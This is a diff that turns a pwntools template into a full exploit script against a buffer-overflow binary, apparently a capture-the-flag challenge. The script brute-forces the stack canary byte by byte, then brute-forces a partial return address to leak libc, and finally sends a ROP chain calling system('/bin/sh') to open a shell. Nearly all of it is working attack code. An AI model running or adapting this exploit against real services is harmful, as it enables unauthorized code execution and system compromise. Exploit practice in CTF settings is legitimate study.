@@ -1,55 +1,85 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 
 from pwn import *
-from ctypes import *
-import time
-import sys
 
-local = 0
-debug = 0
-
+libc = ELF('./libc.so.6', checksec=False)
 context.arch = 'amd64'
-# context.aslr = False
-context.log_level = 'debug'
-# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-# context.timeout = 2
 
-def conn():
-	global local
-	global debug
+info = lambda msg: log.info(msg)
+s = lambda msg: p.send(msg)
 
-	for arg in sys.argv[1:]:
-		if arg in ('-h', '--help'):
-			print('Usage: python ' + sys.argv[0] + ' <option> ...')
-			print('Option:')
-			print('        -h, --help:     Show help')
-			print('        -l, --local:    Running on local')
-			print('        -d, --debug:    Use gdb auto attach')
-			exit(0)
-		if arg in ('-l', '--local'):
-			local = 1
-		if arg in ('-d', '--debug'):
-			debug = 1
+p = remote('127.0.0.1', 10001)
+p.recvuntil(b'> ')
 
-	if local:
-		s = process('./chall')
-		if debug:
-			gdb.attach(s, gdbscript='''
-            b* 0x0000000000401958
-            continue
-			''')
-		else:
-			raw_input('DEBUG')
-	else:
-		s = remote('188.166.220.129', 10001)
+canary = b'\x00'
+info("canary[0] = 0x00")
+for n in range(7):
+    for i in range(1, 0x100):
+        payload = flat(
+            b'A'*0x28,
+            canary, p8(i)         # Brute canary
+            )
+        s(payload)
 
-	return s
+        if b'*** stack smashing detected ***' not in p.recvuntil(b'> '):
+            info(f"canary[{n + 1}] = 0x{hex(i)[2:].rjust(2, '0')}")
+            canary += p8(i)
+            break
+canary = u64(canary)
+info("Canary: " + hex(canary))
 
-s = conn()
+libc_leak = b'\x90'
+for i in range(0xf):
+    payload = flat(
+        b'A'*0x28,
+        canary,                             # Canary
+        b'B'*0x8,                           # Saved rbp
+        libc_leak, p8((i << 4) | 0xd)       # Brute saved rip
+        )
+    s(payload)
+    if b'Segmentation fault' not in p.recvuntil(b'> '):
+        libc_leak += p8((i << 4) | 0xd)
+        break
+if len(libc_leak)==1:
+    print("Something wrong!")
+    exit(0)
+info(f"2 LSB = 0x{hex(u16(libc_leak))[2:].rjust(4, '0')}")
 
-# nc 103.162.14.240 15001
-libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
-# libc = ELF('./libc.so.6)
+# Brute 3 higher bytes
+for n in range(3):
+    for i in range(0x100):
+        payload = flat(
+            b'A'*0x28,
+            p64(canary),
+            b'B'*0x8,
+            libc_leak, p8(i)
+            )
+        s(payload)
 
+        if b'Segmentation fault' not in p.recvuntil(b'> '):
+            info(f"addr_leak[{n+2}] = 0x{hex(i)[2:].rjust(2, '0')}")
+            libc_leak += p8(i)
+            break
 
- 
+libc_leak += b'\x7f'
+libc_leak = u64(libc_leak + b'\0\0')
+libc.address = libc_leak - 0x29d90
+info("Libc leak: " + hex(libc_leak))
+info("Libc base: " + hex(libc.address))
+
+##########################
+### Stage 3: Get shell ###
+##########################
+pop_rdi = libc.address + 0x000000000002a3e5
+ret = libc.address + 0x000000000002a3e6
+payload = flat(
+    b'A'*0x28,
+    p64(canary),
+    b'B'*0x8,
+    ret,
+    pop_rdi, next(libc.search(b'/bin/sh')),
+    libc.sym['system']
+    )
+s(payload)
+
+p.interactive()
